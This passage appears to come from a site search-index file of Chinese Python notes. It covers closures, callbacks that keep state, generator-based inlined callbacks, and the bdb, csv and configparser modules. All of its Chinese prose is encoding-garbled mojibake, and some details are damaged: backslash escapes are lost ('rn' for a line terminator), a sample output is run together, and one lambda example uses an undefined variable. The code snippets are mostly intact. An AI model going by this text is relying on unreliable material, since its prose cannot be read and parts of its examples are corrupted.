ç±»çš„å”¯ä¸€ç›®çš„å°±æ˜¯å…ˆåœ¨æŸä¸ªåœ°æ–¹å­˜å‚¨æ¨¡æ¿å€¼ï¼Œä»¥ä¾¿å°†æ¥ å¯ä»¥åœ¨ open() æ–¹æ³•ä¸­ä½¿ç”¨ã€‚ ä½¿ç”¨ä¸€ä¸ªå†…éƒ¨å‡½æ•°æˆ–è€…é—­åŒ…çš„æ–¹æ¡ˆé€šå¸¸ä¼šæ›´ä¼˜é›…ä¸€äº›ã€‚ç®€å•æ¥è®²ï¼Œä¸€ä¸ªé—­åŒ…å°±æ˜¯ ä¸€ä¸ªå‡½æ•°ï¼Œåªä¸è¿‡åœ¨å‡½æ•°å†…éƒ¨å¸¦ä¸Šäº†ä¸€ä¸ªé¢å¤–çš„å˜é‡ç¯å¢ƒã€‚é—­åŒ…å…³é”®ç‰¹ç‚¹å°±æ˜¯å®ƒä¼šè®° ä½è‡ªå·±è¢«å®šä¹‰æ—¶çš„ç¯å¢ƒã€‚å› æ­¤ï¼Œåœ¨æˆ‘ä»¬çš„è§£å†³æ–¹æ¡ˆä¸­ï¼Œopener() å‡½æ•°è®°ä½äº† template å‚æ•°çš„å€¼ï¼Œå¹¶åœ¨æ¥ä¸‹æ¥çš„è°ƒç”¨ä¸­ä½¿ç”¨å®ƒã€‚ ä»»ä½•æ—¶å€™åªè¦ä½ ç¢°åˆ°éœ€è¦ç»™æŸä¸ªå‡½æ•°å¢åŠ é¢å¤–çš„çŠ¶æ€ä¿¡æ¯çš„é—®é¢˜ï¼Œéƒ½å¯ä»¥è€ƒè™‘ä½¿ ç”¨é—­åŒ…ã€‚ç›¸æ¯”å°†ä½ çš„å‡½æ•°è½¬æ¢æˆä¸€ä¸ªç±»è€Œè¨€ï¼Œé—­åŒ…é€šå¸¸æ˜¯ä¸€ç§æ›´åŠ ç®€æ´å’Œä¼˜é›…çš„æ–¹æ¡ˆã€‚ å¸¦é¢å¤–çŠ¶æ€ä¿¡æ¯çš„å›è°ƒå‡½æ•° ä½ çš„ä»£ç ä¸­éœ€è¦ä¾èµ–åˆ°å›è°ƒå‡½æ•°çš„ä½¿ç”¨ (æ¯”å¦‚äº‹ä»¶å¤„ç†å™¨ã€ç­‰å¾…åå°ä»»åŠ¡å®Œæˆåçš„ å›è°ƒç­‰)ï¼Œå¹¶ä¸”ä½ è¿˜éœ€è¦è®©å›è°ƒå‡½æ•°æ‹¥æœ‰é¢å¤–çš„çŠ¶æ€å€¼ï¼Œä»¥ä¾¿åœ¨å®ƒçš„å†…éƒ¨ä½¿ç”¨åˆ°ã€‚ ä¸»è¦è®¨è®ºçš„æ˜¯é‚£äº›å‡ºç°åœ¨å¾ˆå¤šå‡½æ•°åº“å’Œæ¡†æ¶ä¸­çš„å›è°ƒå‡½æ•°çš„ä½¿ç”¨â€”â€”ç‰¹ åˆ«æ˜¯è·Ÿå¼‚æ­¥å¤„ç†æœ‰å…³çš„ã€‚ä¸ºäº†æ¼”ç¤ºä¸æµ‹è¯•ï¼Œæˆ‘ä»¬å…ˆå®šä¹‰å¦‚ä¸‹ä¸€ä¸ªéœ€è¦è°ƒç”¨å›è°ƒå‡½æ•°çš„å‡½ æ•°: def apply_async(func, args, *, callback): # Compute the result result = func(*args) # Invoke the callback with the result callback(result) ä½¿ç”¨: >>> def print_result(result): ... print('Got:', result) ... >>> def add(x, y): ... return x + y ... >>> apply_async(add, (2, 3), callback=print_result) Got: 5 >>> apply_async(add, ('hello', 'world'), callback=print_result) Got: helloworld >>> ä½¿ç”¨ä¸€ä¸ªé—­åŒ…æ•è·çŠ¶æ€å€¼: def make_handler(): sequence = 0 def handler(result): nonlocal sequence sequence += 1 print('[{}] Got: {}'.format(sequence, result)) return handler ä½¿ç”¨: >>> handler = make_handler() >>> apply_async(add, (2, 3), callback=handler) [1] Got: 5 >>> apply_async(add, ('hello', 'world'), callback=handler) [2] Got: helloworld >>> è¿˜æœ‰å¦å¤–ä¸€ä¸ªæ›´é«˜çº§çš„æ–¹æ³•ï¼Œå¯ä»¥ä½¿ç”¨åç¨‹æ¥å®ŒæˆåŒæ ·çš„äº‹æƒ…: def make_handler(): sequence = 0 while True: result = yield sequence += 1 print('[{}] Got: {}'.format(sequence, result)) å¯¹äºåç¨‹ï¼Œä½ éœ€è¦ä½¿ç”¨å®ƒçš„ send() æ–¹æ³•ä½œä¸ºå›è°ƒå‡½æ•°ï¼Œå¦‚ä¸‹æ‰€ç¤º: >>> handler = make_handler() >>> next(handler) # Advance to the yield >>> apply_async(add, (2, 3), callback=handler.send) [1] Got: 5 >>> apply_async(add, ('hello', 'world'), callback=handler.send) [2] Got: helloworld >>> åŸºäºå›è°ƒå‡½æ•°çš„è½¯ä»¶é€šå¸¸éƒ½æœ‰å¯èƒ½å˜å¾—éå¸¸å¤æ‚ã€‚ä¸€éƒ¨åˆ†åŸå› æ˜¯å›è°ƒå‡½æ•°é€šå¸¸ä¼š è·Ÿè¯·æ±‚æ‰§è¡Œä»£ç æ–­å¼€ã€‚å› æ­¤ï¼Œè¯·æ±‚æ‰§è¡Œå’Œå¤„ç†ç»“æœä¹‹é—´çš„æ‰§è¡Œç¯å¢ƒå®é™…ä¸Šå·²ç»ä¸¢å¤±äº†ã€‚ å¦‚æœä½ æƒ³è®©å›è°ƒå‡½æ•°è¿ç»­æ‰§è¡Œå¤šæ­¥æ“ä½œï¼Œé‚£ä½ å°±å¿…é¡»å»è§£å†³å¦‚ä½•ä¿å­˜å’Œæ¢å¤ç›¸å…³çš„çŠ¶ æ€ä¿¡æ¯äº†ã€‚ è‡³å°‘æœ‰ä¸¤ç§ä¸»è¦æ–¹å¼æ¥æ•è·å’Œä¿å­˜çŠ¶æ€ä¿¡æ¯ï¼Œä½ å¯ä»¥åœ¨ä¸€ä¸ªå¯¹è±¡å®ä¾‹ (é€šè¿‡ä¸€ä¸ªç»‘ å®šæ–¹æ³•) æˆ–è€…åœ¨ä¸€ä¸ªé—­åŒ…ä¸­ä¿å­˜å®ƒã€‚ä¸¤ç§æ–¹å¼ç›¸æ¯”ï¼Œé—­åŒ…æˆ–è®¸æ˜¯æ›´åŠ è½»é‡çº§å’Œè‡ªç„¶ä¸€ç‚¹ï¼Œ å› ä¸ºå®ƒä»¬å¯ä»¥å¾ˆç®€å•çš„é€šè¿‡å‡½æ•°æ¥æ„é€ ã€‚å®ƒä»¬è¿˜èƒ½è‡ªåŠ¨æ•è·æ‰€æœ‰è¢«ä½¿ç”¨åˆ°çš„å˜é‡ã€‚å›  æ­¤ï¼Œä½ æ— éœ€å»æ‹…å¿ƒå¦‚ä½•å»å­˜å‚¨é¢å¤–çš„çŠ¶æ€ä¿¡æ¯ (ä»£ç ä¸­è‡ªåŠ¨åˆ¤å®š)ã€‚ å¦‚æœä½¿ç”¨é—­åŒ…ï¼Œä½ éœ€è¦æ³¨æ„å¯¹é‚£äº›å¯ä¿®æ”¹å˜é‡çš„æ“ä½œã€‚åœ¨ä¸Šé¢çš„æ–¹æ¡ˆä¸­ï¼Œnonlocal å£°æ˜è¯­å¥ç”¨æ¥æŒ‡ç¤ºæ¥ä¸‹æ¥çš„å˜é‡ä¼šåœ¨å›è°ƒå‡½æ•°ä¸­è¢«ä¿®æ”¹ã€‚å¦‚æœæ²¡æœ‰è¿™ä¸ªå£°æ˜ï¼Œä»£ç ä¼šæŠ¥ é”™ è€Œä½¿ç”¨ä¸€ä¸ªåç¨‹æ¥ä½œä¸ºä¸€ä¸ªå›è°ƒå‡½æ•°å°±æ›´æœ‰è¶£äº†ï¼Œå®ƒè·Ÿé—­åŒ…æ–¹æ³•å¯†åˆ‡ç›¸å…³ã€‚æŸç§æ„ ä¹‰ä¸Šæ¥è®²ï¼Œå®ƒæ˜¾å¾—æ›´åŠ ç®€æ´ï¼Œå› ä¸ºæ€»å…±å°±ä¸€ä¸ªå‡½æ•°è€Œå·²ã€‚å¹¶ä¸”ï¼Œä½ å¯ä»¥å¾ˆè‡ªç”±çš„ä¿®æ”¹å˜ é‡è€Œæ— éœ€å»ä½¿ç”¨ nonlocal å£°æ˜ã€‚è¿™ç§æ–¹å¼å”¯ä¸€ç¼ºç‚¹å°±æ˜¯ç›¸å¯¹äºå…¶ä»– Python æŠ€æœ¯è€Œè¨€ æˆ–è®¸æ¯”è¾ƒéš¾ä»¥ç†è§£ã€‚å¦å¤–è¿˜æœ‰ä¸€äº›æ¯”è¾ƒéš¾æ‡‚çš„éƒ¨åˆ†ï¼Œæ¯”å¦‚ä½¿ç”¨ä¹‹å‰éœ€è¦è°ƒç”¨ next() ï¼Œ å®é™…ä½¿ç”¨æ—¶è¿™ä¸ªæ­¥éª¤å¾ˆå®¹æ˜“è¢«å¿˜è®°ã€‚å°½ç®¡å¦‚æ­¤ï¼Œåç¨‹è¿˜æœ‰å…¶ä»–ç”¨å¤„ï¼Œæ¯”å¦‚ä½œä¸ºä¸€ä¸ªå†…è” å›è°ƒå‡½æ•°çš„å®šä¹‰ å¦‚æœä½ ä»…ä»…åªéœ€è¦ç»™å›è°ƒå‡½æ•°ä¼ é€’é¢å¤–çš„å€¼çš„è¯ï¼Œè¿˜æœ‰ä¸€ç§ä½¿ç”¨ partial() çš„æ–¹ å¼ä¹Ÿå¾ˆæœ‰ç”¨ã€‚åœ¨æ²¡æœ‰ä½¿ç”¨ partial() çš„æ—¶å€™ï¼Œä½ å¯èƒ½ç»å¸¸çœ‹åˆ°ä¸‹é¢è¿™ç§ä½¿ç”¨ lambda è¡¨ è¾¾å¼çš„å¤æ‚ä»£ç : >>> apply_async(add, (2, 3), callback=lambda r: handler(r, seq)) [1] Got: 5 >>> å†…è”å›è°ƒå‡½æ•° å½“ä½ ç¼–å†™ä½¿ç”¨å›è°ƒå‡½æ•°çš„ä»£ç çš„æ—¶å€™ï¼Œæ‹…å¿ƒå¾ˆå¤šå°å‡½æ•°çš„æ‰©å¼ å¯èƒ½ä¼šå¼„ä¹±ç¨‹åºæ§ åˆ¶æµã€‚ä½ å¸Œæœ›æ‰¾åˆ°æŸä¸ªæ–¹æ³•æ¥è®©ä»£ç çœ‹ä¸Šå»æ›´åƒæ˜¯ä¸€ä¸ªæ™®é€šçš„æ‰§è¡Œåºåˆ—ã€‚ é€šè¿‡ä½¿ç”¨ç”Ÿæˆå™¨å’Œåç¨‹å¯ä»¥ä½¿å¾—å›è°ƒå‡½æ•°å†…è”åœ¨æŸä¸ªå‡½æ•°ä¸­ å‡è®¾ä½ æœ‰å¦‚ä¸‹æ‰€ç¤ºçš„ä¸€ä¸ªæ‰§è¡ŒæŸç§è®¡ç®—ä»»åŠ¡ç„¶åè°ƒç”¨ä¸€ä¸ªå›è°ƒå‡½æ•°çš„å‡½æ•°: def apply_async(func, args, *, callback): # Compute the result result = func(*args) # Invoke the callback with the result callback(result) æ¥ä¸‹æ¥è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹ä¸‹é¢çš„ä»£ç ï¼Œå®ƒåŒ…å«äº†ä¸€ä¸ª Async ç±»å’Œä¸€ä¸ª inlined_async è£…é¥°å™¨: from queue import Queue from functools import wraps class Async: def __init__(self, func, args): self.func = func self.args = args def inlined_async(func): @wraps(func) def wrapper(*args): f = func(*args) result_queue = Queue() result_queue.put(None) while True: result = result_queue.get() try: a = f.send(result) apply_async(a.func, a.args, callback=result_queue.put) except StopIteration: break return wrapper è¿™ä¸¤ä¸ªä»£ç ç‰‡æ®µå…è®¸ä½ ä½¿ç”¨ yield è¯­å¥å†…è”å›è°ƒæ­¥éª¤ã€‚æ¯”å¦‚: def add(x, y): return x + y @inlined_async def test(): r = yield Async(add, (2, 3)) print(r) r = yield Async(add, ('hello', 'world')) print(r) for n in range(10): r = yield Async(add, (n, n)) print(r) print('Goodbye') å¦‚æœä½ è°ƒç”¨ test() ï¼Œä½ ä¼šå¾—åˆ°ç±»ä¼¼å¦‚ä¸‹çš„è¾“å‡º: 5 helloworld 0 2468 10 12 14 16 18 Goodbye ä½ ä¼šå‘ç°ï¼Œé™¤äº†é‚£ä¸ªç‰¹åˆ«çš„è£…é¥°å™¨å’Œ yield è¯­å¥å¤–ï¼Œå…¶ä»–åœ°æ–¹å¹¶æ²¡æœ‰å‡ºç°ä»»ä½•çš„ å›è°ƒå‡½æ•° (å…¶å®æ˜¯åœ¨åå°å®šä¹‰çš„) å…³äºå›è°ƒå‡½æ•°ã€ç”Ÿæˆå™¨å’Œæ§åˆ¶æµ åœ¨éœ€è¦ä½¿ç”¨åˆ°å›è°ƒçš„ä»£ç ä¸­ï¼Œå…³é”®ç‚¹åœ¨äºå½“å‰è®¡ç®—å·¥ä½œä¼šæŒ‚èµ·å¹¶åœ¨å°†æ¥ çš„æŸä¸ªæ—¶å€™é‡å¯ (æ¯”å¦‚å¼‚æ­¥æ‰§è¡Œ)ã€‚å½“è®¡ç®—é‡å¯æ—¶ï¼Œå›è°ƒå‡½æ•°è¢«è°ƒç”¨æ¥ç»§ç»­å¤„ç†ç»“æœã€‚ apply_async() å‡½æ•°æ¼”ç¤ºäº†æ‰§è¡Œå›è°ƒçš„å®é™…é€»è¾‘ï¼Œå°½ç®¡å®é™…æƒ…å†µä¸­å®ƒå¯èƒ½ä¼šæ›´åŠ å¤æ‚ (åŒ…æ‹¬çº¿ç¨‹ã€è¿›ç¨‹ã€äº‹ä»¶å¤„ç†å™¨ç­‰ç­‰)ã€‚ è®¡ç®—çš„æš‚åœä¸é‡å¯æ€è·¯è·Ÿç”Ÿæˆå™¨å‡½æ•°çš„æ‰§è¡Œæ¨¡å‹ä¸è°‹è€Œåˆã€‚å…·ä½“æ¥è®²ï¼Œyield æ“ä½œ ä¼šä½¿ä¸€ä¸ªç”Ÿæˆå™¨å‡½æ•°äº§ç”Ÿä¸€ä¸ªå€¼å¹¶æš‚åœã€‚æ¥ä¸‹æ¥è°ƒç”¨ç”Ÿæˆå™¨çš„ __next__() æˆ– send() æ–¹æ³•åˆä¼šè®©å®ƒä»æš‚åœå¤„ç»§ç»­æ‰§è¡Œã€‚ è®¿é—®é—­åŒ…ä¸­å®šä¹‰çš„å˜é‡ æƒ³è¦æ‰©å±•å‡½æ•°ä¸­çš„æŸä¸ªé—­åŒ…ï¼Œå…è®¸å®ƒèƒ½è®¿é—®å’Œä¿®æ”¹å‡½æ•°çš„å†…éƒ¨å˜é‡ é€šå¸¸æ¥è®²ï¼Œé—­åŒ…çš„å†…éƒ¨å˜é‡å¯¹äºå¤–ç•Œæ¥è®²æ˜¯å®Œå…¨éšè—çš„ã€‚ä½†æ˜¯ï¼Œä½ å¯ä»¥é€šè¿‡ç¼–å†™è®¿ é—®å‡½æ•°å¹¶å°†å…¶ä½œä¸ºå‡½æ•°å±æ€§ç»‘å®šåˆ°é—­åŒ…ä¸Šæ¥å®ç°è¿™ä¸ªç›®çš„ã€‚ä¾‹å¦‚: def sample(): n = 0 # Closure function def func(): print('n=', n) # Accessor methods for n def get_n(): return n def set_n(value): nonlocal n n = value # Attach as function attributes func.get_n = get_n func.set_n = set_n return func ä½¿ç”¨: >>> f = sample() >>> f() n= 0 >>> f.set_n(10) >>> f() n= 10 >>> f.get_n() 10 >>> ä¸ºäº†è¯´æ˜æ¸…æ¥šå®ƒå¦‚ä½•å·¥ä½œçš„ï¼Œæœ‰ä¸¤ç‚¹éœ€è¦è§£é‡Šä¸€ä¸‹ã€‚é¦–å…ˆï¼Œnonlocal å£°æ˜å¯ä»¥è®© æˆ‘ä»¬ç¼–å†™å‡½æ•°æ¥ä¿®æ”¹å†…éƒ¨å˜é‡çš„å€¼ã€‚å…¶æ¬¡ï¼Œå‡½æ•°å±æ€§å…è®¸æˆ‘ä»¬ç”¨ä¸€ç§å¾ˆç®€å•çš„æ–¹å¼å°†è®¿ é—®æ–¹æ³•ç»‘å®šåˆ°é—­åŒ…å‡½æ•°ä¸Šï¼Œè¿™ä¸ªè·Ÿå®ä¾‹æ–¹æ³•å¾ˆåƒ (å°½ç®¡å¹¶æ²¡æœ‰å®šä¹‰ä»»ä½•ç±»)ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-cookbook-function.html","loc":"/yq-doc-source-docs-rear-end-python-cookbook-function.html"},{"title":"åˆ†ç±»","text":"æ¨¡ç‰ˆæ ¡éªŒ /docs/åç«¯/python/pythonæ ‡å‡†åº“/configparser ç½‘ç»œç¼–ç¨‹ /docs/åç«¯/python/pythonæ ‡å‡†åº“/socket /docs/åç«¯/python/pythonæ ‡å‡†åº“/socketserver /docs/åç«¯/python/pythonæ ‡å‡†åº“/ssl","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-.Classification.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-.Classification.html"},{"title":"bdb","text":"å®˜ç½‘: https://docs.python.org/zh-cn/3/library/bdb.html è°ƒè¯•å™¨æ¡†æ¶. æ¨¡å—å¤„ç†åŸºæœ¬çš„è°ƒè¯•å™¨å‡½æ•°ï¼Œä¾‹å¦‚è®¾ç½®æ–­ç‚¹æˆ–é€šè¿‡è°ƒè¯•å™¨æ¥ç®¡ç†æ‰§è¡Œã€‚ ç®€å•ä»‹ç»éƒ¨åˆ†","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-BDB.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-BDB.html"},{"title":"csv","text":"å®˜ç½‘: csv - CSV æ–‡ä»¶è¯»å†™ CSV (Comma Separated Values) æ ¼å¼æ˜¯ç”µå­è¡¨æ ¼å’Œæ•°æ®åº“ä¸­æœ€å¸¸è§çš„è¾“å…¥ã€è¾“å‡ºæ–‡ä»¶æ ¼å¼ã€‚ csv æ¨¡å—å®ç°äº† CSV æ ¼å¼è¡¨å•æ•°æ®çš„è¯»å†™ã€‚ å…¶æä¾›äº†è¯¸å¦‚\"ä»¥å…¼å®¹ Excel çš„æ–¹å¼è¾“å‡ºæ•°æ®æ–‡ä»¶\"æˆ–\"è¯»å– Excel ç¨‹åºè¾“å‡ºçš„æ•°æ®æ–‡ä»¶\"çš„åŠŸèƒ½ï¼Œ ç¨‹åºå‘˜æ— éœ€çŸ¥é“ Excel æ‰€é‡‡ç”¨ CSV æ ¼å¼çš„ç»†èŠ‚ã€‚ æ­¤æ¨¡å—åŒæ ·å¯ä»¥ç”¨äºå®šä¹‰å…¶ä»–åº”ç”¨ç¨‹åºå¯ç”¨çš„ CSV æ ¼å¼æˆ–å®šä¹‰ç‰¹å®šéœ€æ±‚çš„ CSV æ ¼å¼ã€‚ csv æ¨¡å—ä¸­çš„ reader ç±»å’Œ writer ç±»å¯ç”¨äºè¯»å†™åºåˆ—åŒ–çš„æ•°æ®ã€‚ ä¹Ÿå¯ä½¿ç”¨ DictReader ç±»å’Œ DictWriter ç±»ä»¥å­—å…¸çš„å½¢å¼è¯»å†™æ•°æ®ã€‚ æä¾›çš„å‡½æ•° æä¾›çš„ç±» DictReader DictWriter Dialect excel excel_tab unix_dialect Sniffer DictReader DictWriter Dialect excel excel_tab unix_dialect Sniffer æä¾›çš„å¸¸é‡ csv.QUOTE_ALL: æŒ‡ç¤º writer å¯¹è±¡ç»™æ‰€æœ‰å­—æ®µåŠ ä¸Šå¼•å·ã€‚ csv.QUOTE_MINIMAL: æŒ‡ç¤º writer å¯¹è±¡ä»…ä¸ºåŒ…å«ç‰¹æ®Šå­—ç¬¦ï¼ˆä¾‹å¦‚ å®šç•Œç¬¦ã€å¼•å·å­—ç¬¦ æˆ– è¡Œç»“æŸç¬¦ ä¸­çš„ä»»ä½•å­—ç¬¦ï¼‰çš„å­—æ®µåŠ ä¸Šå¼•å·ã€‚ csv.QUOTE_NONNUMERIC: æŒ‡ç¤º writer å¯¹è±¡ä¸ºæ‰€æœ‰éæ•°å­—å­—æ®µåŠ ä¸Šå¼•å·ã€‚ æŒ‡ç¤º reader å°†æ‰€æœ‰æœªç”¨å¼•å·å¼•å‡ºçš„å­—æ®µè½¬æ¢ä¸º float ç±»å‹ã€‚ csv.QUOTE_NONE: æŒ‡ç¤º writer å¯¹è±¡ä¸ä½¿ç”¨å¼•å·å¼•å‡ºå­—æ®µã€‚ å½“ å®šç•Œç¬¦ å‡ºç°åœ¨è¾“å‡ºæ•°æ®ä¸­æ—¶ï¼Œå…¶å‰é¢åº”è¯¥æœ‰ è½¬ä¹‰ç¬¦ã€‚ å¦‚æœæœªè®¾ç½® è½¬ä¹‰ç¬¦ï¼Œåˆ™é‡åˆ°ä»»ä½•éœ€è¦è½¬ä¹‰çš„å­—ç¬¦æ—¶ï¼Œwriter éƒ½ä¼šæŠ›å‡º Error å¼‚å¸¸ã€‚ æŒ‡ç¤º reader ä¸å¯¹å¼•å·å­—ç¬¦è¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚ å˜ç§ä¸æ ¼å¼å‚æ•° ä¸ºäº†æ›´å®¹æ˜“æŒ‡å®šè¾“å…¥å’Œè¾“å‡ºè®°å½•çš„æ ¼å¼, ç‰¹å®šçš„ä¸€ç»„æ ¼å¼å‚æ•°ç»„åˆä¸ºä¸€ä¸ª dialectï¼ˆå˜ç§ï¼‰ ä¸€ä¸ª dialect æ˜¯ä¸€ä¸ª Dialect ç±»çš„å­ç±»ï¼Œ å®ƒå…·æœ‰ä¸€ç»„ç‰¹å®šçš„æ–¹æ³•å’Œä¸€ä¸ª validate() æ–¹æ³•ã€‚ åˆ›å»º reader æˆ– writer å¯¹è±¡æ—¶ï¼Œç¨‹åºå‘˜å¯ä»¥å°†æŸä¸ªå­—ç¬¦ä¸²æˆ– Dialect ç±»çš„å­ç±»æŒ‡å®šä¸º dialect å‚æ•°ã€‚ è¦æƒ³è¡¥å……æˆ–è¦†ç›– dialect å‚æ•°ï¼Œç¨‹åºå‘˜è¿˜å¯ä»¥å•ç‹¬æŒ‡å®šæŸäº›æ ¼å¼å‚æ•°ï¼Œè¿™äº›å‚æ•°çš„åç§°ä¸ä¸‹é¢ Dialect ç±»å®šä¹‰çš„å±æ€§ç›¸åŒã€‚ Dialectæ”¯æŒå±æ€§ Dialect ç±»æ”¯æŒä»¥ä¸‹å±æ€§: Dialect.delimiter: ä¸€ä¸ªç”¨äºåˆ†éš”å­—æ®µçš„å•å­—ç¬¦ï¼Œé»˜è®¤ä¸º ','ã€‚ Dialect.doublequote: æ§åˆ¶å‡ºç°åœ¨å­—æ®µä¸­çš„ å¼•å·å­—ç¬¦ æœ¬èº«åº”å¦‚ä½•è¢«å¼•å‡ºã€‚ å½“è¯¥å±æ€§ä¸º True æ—¶ï¼ŒåŒå†™å¼•å·å­—ç¬¦ã€‚ å¦‚æœè¯¥å±æ€§ä¸º Falseï¼Œåˆ™åœ¨ å¼•å·å­—ç¬¦ çš„å‰é¢æ”¾ç½® è½¬ä¹‰ç¬¦ã€‚é»˜è®¤å€¼ä¸º Trueã€‚ åœ¨è¾“å‡ºæ—¶ï¼Œå¦‚æœ doublequote æ˜¯ Falseï¼Œä¸” è½¬ä¹‰ç¬¦ æœªæŒ‡å®šï¼Œä¸”åœ¨å­—æ®µä¸­å‘ç° å¼•å·å­—ç¬¦ æ—¶ï¼Œä¼šæŠ›å‡º Error å¼‚å¸¸ã€‚ Dialect.escapechar: ä¸€ä¸ªç”¨äº writer çš„å•å­—ç¬¦ï¼Œç”¨æ¥åœ¨ quoting è®¾ç½®ä¸º QUOTE_NONE çš„æƒ…å†µä¸‹è½¬ä¹‰ å®šç•Œç¬¦ï¼Œ åœ¨ doublequote è®¾ç½®ä¸º False çš„æƒ…å†µä¸‹è½¬ä¹‰ å¼•å·å­—ç¬¦ã€‚ åœ¨è¯»å–æ—¶ï¼Œescapechar å»é™¤äº†å…¶åæ‰€è·Ÿå­—ç¬¦çš„ä»»ä½•ç‰¹æ®Šå«ä¹‰ã€‚è¯¥å±æ€§é»˜è®¤ä¸º Noneï¼Œè¡¨ç¤ºç¦ç”¨è½¬ä¹‰ã€‚ åœ¨ 3.11 ç‰ˆæ›´æ”¹: An empty escapechar is not allowed. Dialect.lineterminator: æ”¾åœ¨ writer äº§ç”Ÿçš„è¡Œçš„ç»“å°¾ï¼Œé»˜è®¤ä¸º 'rn'ã€‚ å¤‡æ³¨ reader ç»è¿‡ç¡¬ç¼–ç ï¼Œä¼šè¯†åˆ« 'r' æˆ– 'n' ä½œä¸ºè¡Œå°¾ï¼Œå¹¶å¿½ç•¥ lineterminatorã€‚æœªæ¥å¯èƒ½ä¼šæ›´æ”¹è¿™ä¸€è¡Œä¸ºã€‚ Dialect.quotechar: ä¸€ä¸ªå•å­—ç¬¦ï¼Œç”¨äºåŒ…ä½å«æœ‰ç‰¹æ®Šå­—ç¬¦çš„å­—æ®µï¼Œç‰¹æ®Šå­—ç¬¦å¦‚ å®šç•Œç¬¦ æˆ– å¼•å·å­—ç¬¦ æˆ–æ¢è¡Œç¬¦ã€‚é»˜è®¤ä¸º '\"'ã€‚ åœ¨ 3.11 ç‰ˆæ›´æ”¹: An empty quotechar is not allowed. Dialect.quoting: æ§åˆ¶ writer ä½•æ—¶ç”Ÿæˆå¼•å·ï¼Œä»¥åŠ reader ä½•æ—¶è¯†åˆ«å¼•å·ã€‚ è¯¥å±æ€§å¯ä»¥ç­‰äºä»»ä½• QUOTE_* å¸¸é‡ï¼ˆå‚è§ æ¨¡å—å†…å®¹ æ®µè½ï¼‰ï¼Œé»˜è®¤ä¸º QUOTE_MINIMALã€‚ Dialect.skipinitialspace: When True, spaces immediately following the delimiter are ignored. The default is False. Dialect.strict: å¦‚æœä¸º Trueï¼Œåˆ™åœ¨è¾“å…¥é”™è¯¯çš„ CSV æ—¶æŠ›å‡º Error å¼‚å¸¸ã€‚é»˜è®¤å€¼ä¸º Falseã€‚ Reader å¯¹è±¡ Reader å¯¹è±¡ ( DictReader å®ä¾‹å’Œ reader() å‡½æ•°è¿”å›çš„å¯¹è±¡) å…·æœ‰ä»¥ä¸‹å…¬å¼€æ–¹æ³•ï¼š Reader å¯¹è±¡å…·æœ‰ä»¥ä¸‹å…¬å¼€å±æ€§ï¼š csvreader.dialect: å˜ç§æè¿°ï¼Œåªè¯»ï¼Œä¾›è§£æå™¨ä½¿ç”¨ã€‚ csvreader.line_num: æºè¿­ä»£å™¨å·²ç»è¯»å–äº†çš„è¡Œæ•°ã€‚å®ƒä¸è¿”å›çš„è®°å½•æ•°ä¸åŒï¼Œå› ä¸ºè®°å½•å¯èƒ½è·¨è¶Šå¤šè¡Œã€‚ DictReader å¯¹è±¡å…·æœ‰ä»¥ä¸‹å…¬å¼€å±æ€§ï¼š DictReader.fieldnames: å­—æ®µåç§°ã€‚å¦‚æœåœ¨åˆ›å»ºå¯¹è±¡æ—¶æœªä¼ å…¥å­—æ®µåç§°ï¼Œåˆ™é¦–æ¬¡è®¿é—®æ—¶æˆ–ä»æ–‡ä»¶ä¸­è¯»å–ç¬¬ä¸€æ¡è®°å½•æ—¶ä¼šåˆå§‹åŒ–æ­¤å±æ€§ã€‚ Writer å¯¹è±¡ Writer å¯¹è±¡ï¼ˆDictWriter å®ä¾‹å’Œ writer() å‡½æ•°è¿”å›çš„å¯¹è±¡ï¼‰å…·æœ‰ä¸‹é¢çš„å…¬å¼€æ–¹æ³•ã€‚ å¯¹äº Writer å¯¹è±¡ï¼Œè¡Œ å¿…é¡»æ˜¯ï¼ˆä¸€ç»„å¯è¿­ä»£çš„ï¼‰å­—ç¬¦ä¸²æˆ–æ•°å­—ã€‚ å¯¹äº DictWriter å¯¹è±¡ï¼Œè¡Œ å¿…é¡»æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¿™ä¸ªå­—å…¸å°†å­—æ®µåæ˜ å°„ä¸ºå­—ç¬¦ä¸²æˆ–æ•°å­—ï¼ˆæ•°å­—è¦å…ˆç»è¿‡ str() è½¬æ¢ç±»å‹ï¼‰ã€‚ è¯·æ³¨æ„ï¼Œè¾“å‡ºçš„å¤æ•°ä¼šæœ‰æ‹¬å·åŒ…å›´ã€‚è¿™æ ·å…¶ä»–ç¨‹åºè¯»å– CSV æ–‡ä»¶æ—¶å¯èƒ½ä¼šæœ‰ä¸€äº›é—®é¢˜ï¼ˆå‡è®¾å®ƒä»¬å®Œå…¨æ”¯æŒå¤æ•°ï¼‰ã€‚ Writer å¯¹è±¡å…·æœ‰ä»¥ä¸‹å…¬å¼€å±æ€§ï¼š csvwriter.dialect: å˜ç§æè¿°ï¼Œåªè¯»ï¼Œä¾› writer ä½¿ç”¨ã€‚ DictWriter å¯¹è±¡å…·æœ‰ä»¥ä¸‹å…¬å¼€æ–¹æ³•ï¼š","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-standard-library-CSV.html","loc":"/yq-doc-source-docs-rear-end-python-python-standard-library-CSV.html"},{"title":"configparser","text":"ä»‹ç» configparser æ¨¡å—ä¸»è¦æ˜¯ç”¨æ¥è¯»å†™é…ç½®æ–‡ä»¶çš„, æ¯”å¦‚ ini ç±»å‹çš„æ–‡ä»¶. è¯»å–ç»“æœä»¥èŠ‚çš„å½¢å¼å±•ç¤º, æ¯ä¸€ä¸ªèŠ‚ä¸‹å«é€‰é¡¹å­—å…¸ ç”¨ä¾‹ [default] a = 1 b = 2 c = 3 [dev] a = 11 b = 22 c = 33 [test] a = 111 b = 222 c = 333 # coding: utf-8 # # Copyright (C) 2022-2022, Inc. All Rights Reserved # # @Time : 2022/12/14 ä¸‹åˆ1:41 # @Author : yan que # @Email : yanquer@qq.com # @File : t_configparser.py # @Project : mytest import configparser from typing import Dict , List class MyConfig ( object ): _config_path : str _config_parser = configparser . ConfigParser () def _write_file ( self ): with open ( self . _config_path , 'w' ) as f : self . _config_parser . write ( f ) def save ( self ): self . _write_file () def _read_file ( self ): self . _config_parser . read ( self . _config_path , encoding = 'utf-8' ) def 